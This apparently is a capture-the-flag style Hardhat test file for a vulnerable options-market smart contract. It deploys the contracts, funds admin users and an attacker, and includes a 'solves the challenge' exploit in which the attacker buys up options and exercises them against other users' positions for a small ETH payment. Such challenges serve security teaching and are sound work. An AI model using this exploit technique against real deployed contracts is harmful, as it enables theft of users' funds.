...
before(async () => {
	...
	await usdc.connect(admin).mintPerUser(
		adminUserAddresses,
		Array(5).fill(precision.mul(2_000)) // strike price
	);
	await usdc.connect(admin).mintPerUser(
		[await attacker.getAddress()],
		[precision.mul(500)] // attacker starts with 500 USDC
	);

	// deploying core contracts
	let optionsMarketFactory = await ethers.getContractFactory("OptionsMarket");
	optionsMarket = await optionsMarketFactory
		.connect(admin)
		.deploy(usdc.address);

	let optionsContractFactory = await ethers.getContractFactory(
		"OptionsContract"
	);
	...
	await optionsMarket
		.connect(admin)
		.setOptionsContract(optionsContract.address);

	// -- adminUser(s) purchase 1 option each
	for (let i = 0; i < adminUserAccounts.length; i++) {
		await usdc
			.connect(adminUserAccounts[i])
			.approve(optionsContract.address, precision.mul(2_000));
		await optionsContract
			.connect(adminUserAccounts[i])
			.createAndSellERC20CollateralOption(precision.mul(2_000));
	}
...
it("solves the challenge", async function () {
	const exerciseAmount = precision.mul(5);
	const exerciseValue = precision;
	await usdc
		.connect(attacker)
		.approve(optionsMarket.address, ethers.constants.MaxUint256);
	const optionsBalance = await optionsContract.balanceOf(
		optionsMarket.address
	);
	await optionsMarket.connect(attacker).purchase(optionsBalance);
	await optionsContract
		.connect(attacker)
		.exercise(exerciseAmount, adminUserAddresses, {
			value: exerciseValue,
		});
});
...
after(async () => {
	...
	).to.be.gte(attackerStart.sub(precision.mul(11).div(10)));
});
